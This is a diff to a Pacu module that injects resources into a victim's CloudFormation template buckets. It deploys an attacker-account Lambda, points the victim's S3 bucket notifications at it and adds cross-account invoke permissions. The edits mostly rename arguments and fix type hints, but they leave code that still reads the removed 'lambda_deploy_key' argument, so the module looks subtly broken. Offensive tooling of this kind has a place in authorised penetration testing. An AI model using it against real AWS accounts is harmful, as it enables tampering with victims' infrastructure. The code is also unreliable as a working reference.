@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 import argparse
-import copy
 import json
 import os
 import shutil
@@ -11,7 +10,6 @@ from typing import TYPE_CHECKING, cast
 import boto3
 import botocore.exceptions
 from botocore.exceptions import ClientError
-from mypy_boto3_s3.type_defs import NotificationConfigurationTypeDef
 
 from pacu import Main
 from pacu.core.lib import module_data_dir
@@ -23,10 +21,11 @@ class PacuException(Exception):
 
 
 if TYPE_CHECKING:
-    import mypy_boto3_iam
-    import mypy_boto3_iam.type_defs
     import mypy_boto3_s3
     import mypy_boto3_lambda
+
+    from mypy_boto3_s3.type_defs import NotificationConfigurationTypeDef, \
+        NotificationConfigurationResponseMetadataTypeDef
 
 module_info = {
     'name': 'cfn__resource_injection',
@@ -50,9 +49,15 @@ Example: arn:aws:iam::123456789012:role/example.
 '''.strip())
 
 parser.add_argument('--delete', action='store_true', help='Delete an existing deployment.')
-parser.add_argument('--lambda-deploy-key', help='Pacu key name to use for the attacker account when deploying the lambda function.')
-parser.add_argument('--s3-access-key', help='Pacu key name to use for the deployed lambda function to access S3 in the victim account account.')
-parser.add_argument('--s3-notifications-setup-key', help='Pacu key name to use for configuring the victims S3 buckets to send notifications to our lambda function.')
+parser.add_argument('--attacker-key', required=True,
+                    help='Pacu key name to use for the attacker account when deploying the lambda function.')
+parser.add_argument('--s3-access-key', required=True,
+                    help='Pacu key name to use for the deployed lambda function to access S3 in the victim account '
+                         'account.')
+parser.add_argument('--s3-notifications-setup-key',
+                    help='Pacu key name to use for configuring the victims S3 buckets to send notifications to our '
+                         'lambda function. If this is not specified the s3-access-key credentials will be used for '
+                         'this instead.')
 parser.add_argument('--bucket', help=' The S3 Bucket name to target, this is usually something like cf-templates-*.')
 
 LAMBDA_NAME = "cfn__resource_injection_lambda-dev-update_template"
@@ -111,7 +116,7 @@ def prompt(options, msg: str, opt_print_func=lambda o: o) -> str:
             print("Invalid selection")
 
 
-def get_account_id(sess: 'boto3.session.Session'):
+def get_account_id(sess: 'boto3.Session'):
     return sess.client('sts').get_caller_identity()['Account']
 
 
@@ -123,6 +128,12 @@ def main(args, pacu_main: 'Main'):
     args = parser.parse_args(args)
     print = pacu_main.print
     ######
+
+    # Default to using the s3_access_key if s3_notifications_setup_key is not provided.
+    if args.s3_notifications_setup_key:
+        s3_notifications_setup_key = args.s3_notifications_setup_key
+    else:
+        s3_notifications_setup_key = args.s3_access_key
 
     user = pacu_main.key_info()
     principal = args.principal or user['Arn']
@@ -153,7 +164,7 @@ def main(args, pacu_main: 'Main'):
 
     region = get_region(bucket, pacu_main.get_regions('lambda'))
     sess_lambda_deploy = get_session_from_key_name(pacu_main, args.lambda_deploy_key, region)
-    sess_s3_notifications = get_session_from_key_name(pacu_main, args.s3_notifications_setup_key, region)
+    sess_s3_notifications = get_session_from_key_name(pacu_main, s3_notifications_setup_key, region)
 
     # No need to remove this on args.delete since we are deleting the lambda either way.
     if not args.delete:
@@ -183,12 +194,12 @@ def lambda_env(pacu: 'Main', bucket: str, key: 'AWSKey'):
     return env
 
 
-def deploy_lambda(pacu: 'Main', env: dict, deploy_dir: str, bucket: str, principal: str, s3_key: 'AWSKey'):
+def deploy_lambda(pacu: 'Main', env: dict, deploy_dir: Path, bucket: str, principal: str, s3_key: 'AWSKey'):
     print = pacu.print
 
     print(f"Will deploy lambda to {env['AWS_DEFAULT_REGION']}")
     if not deploy_dir.exists():
-        shutil.copytree((Path(__file__).parent / 'cfn__mitm_lambda'), deploy_dir, dirs_exist_ok=True)
+        shutil.copytree((Path(__file__).parent / 'cfn__resource_injection_lambda'), deploy_dir, dirs_exist_ok=True)
 
     config_path = deploy_dir / '.chalice' / 'config.json'
     config = json.loads(config_path.read_text())
@@ -207,7 +218,8 @@ def deploy_lambda(pacu: 'Main', env: dict, deploy_dir: str, bucket: str, princip
         subprocess.check_call(cmd, env=env)
     except subprocess.CalledProcessError as e:
         # The deploy will fail when attempting to add the trigger to the cross account bucket because we're using the
-        # keys for the attacker account. This is ok as long as the resource permissions get added to the deployed lambda.
+        # keys for the attacker account. This is ok as long as the resource permissions get added to the deployed
+        # lambda.
         if e.returncode == 2:
             pass
         else:
@@ -223,10 +235,10 @@ def delete_lambda(bucket_lambda_dir, env):
 
 
 def get_session_from_key_name(pacu_main: 'Main', key_name: str, region: str):
-    key: 'awskey' = pacu_main.get_aws_key_by_alias(key_name)
+    key: 'AWSKey' = pacu_main.get_aws_key_by_alias(key_name)
     if not key:
         print(f"Did not find the key {key_name} in pacu, make sure to set this with `set_keys` first.")
-    return boto3.session.Session(
+    return boto3.Session(
         region_name=region,
         aws_access_key_id=key.access_key_id,
         aws_secret_access_key=key.secret_access_key,
@@ -234,7 +246,7 @@ def get_session_from_key_name(pacu_main: 'Main', key_name: str, region: str):
     )
 
 
-def put_bucket_notification(sess: 'boto3.session.Session', bucket: str, lambda_arn: str):
+def put_bucket_notification(sess: 'boto3.Session', bucket: str, lambda_arn: str):
     s3 = sess.client('s3')
     resp = s3.get_bucket_notification_configuration(Bucket=bucket)
     conf = remove_our_notification(resp)
@@ -265,7 +277,7 @@ def put_bucket_notification(sess: 'boto3.session.Session', bucket: str, lambda_a
             raise e
 
 
-def remove_bucket_notification(sess: 'boto3.session.Session', bucket: str):
+def remove_bucket_notification(sess: 'boto3.Session', bucket: str):
     s3 = sess.client('s3')
     resp = s3.get_bucket_notification_configuration(Bucket=bucket)
     resp = remove_our_notification(resp)
@@ -304,7 +316,7 @@ def add_lambda_permission(sess, bucket_account, bucket, lambda_name):
             raise e
 
 
-def remove_lambda_permission(sess: 'boto3.session.Session', lambda_name: str):
+def remove_lambda_permission(sess: 'boto3.Session', lambda_name: str):
     lambda_attacker: 'mypy_boto3_lambda.Client' = sess.client('lambda')
     lambda_attacker.remove_permission(
         FunctionName=lambda_name,
